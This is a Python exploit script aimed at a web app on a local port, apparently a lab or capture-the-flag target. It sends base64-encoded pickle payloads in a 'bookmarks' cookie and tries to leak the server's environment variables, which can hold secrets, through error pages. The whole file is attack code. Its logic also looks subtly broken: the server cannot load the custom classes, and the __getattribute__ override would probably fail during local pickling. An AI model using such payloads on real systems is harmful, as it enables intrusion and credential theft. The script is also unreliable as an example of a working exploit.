import requests
import pickle
import base64

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0"}

# The payload creates objects that have __getitem__/__iter__ methods
# that execute code when the list is processed

class ExploitObject:
    """An object that looks like a list item but triggers RCE when accessed"""
    def __init__(self):
        self._triggered = False
    
    def __getattribute__(self, name):
        # Intercept attribute access
        if name == "_triggered":
            return object.__getattribute__(self, name)
        
        # Execute code and raise exception
        import os
        env = dict(os.environ)
        raise RuntimeError(f"EXPLOIT_ENV: {env}")
    
    # Required attributes for the bookmark to look valid
    def __str__(self):
        return "exploit"
    
    def __repr__(self):
        return "exploit"

# Pickle this object
obj = ExploitObject()
try:
    pickled = pickle.dumps(obj, protocol=4)
    encoded = base64.b64encode(pickled).decode()
    print(f"[*] ExploitObject payload: {encoded}")

    response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers, timeout=5)
    print(f"[*] Status: {response.status_code}")
    
    if response.status_code == 500:
        print(f"[!] 500 FOUND!")
        print(response.text[:2000])
except Exception as e:
    print(f"[*] Error: {e}")

# Try with collections.UserList
class FakeURL:
    """Object that mimics URL dict structure but triggers RCE"""
    def __getitem__(self, key):
        if key == 'url':
            import os
            env_str = str(dict(os.environ))
            raise RuntimeError(f"URL_ENV: {env_str}")
        return "fake"
    
    def __iter__(self):
        return iter(['url', 'name'])
    
    def keys(self):
        return ['url', 'name']
    
    def __contains__(self, key):
        return key in ['url', 'name']

class PayloadFakeURL:
    def __reduce__(self):
        return (list, ([FakeURL()],))

try:
    pickled = pickle.dumps(PayloadFakeURL(), protocol=4)
    encoded = base64.b64encode(pickled).decode()
    print(f"\n[*] FakeURL list payload: {encoded}")

    response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers, timeout=5)
    print(f"[*] Status: {response.status_code}")
    if response.status_code == 500:
        print(f"[!] 500 FOUND!")
        print(response.text[:2000])
except Exception as e:
    print(f"[*] Error: {e}")

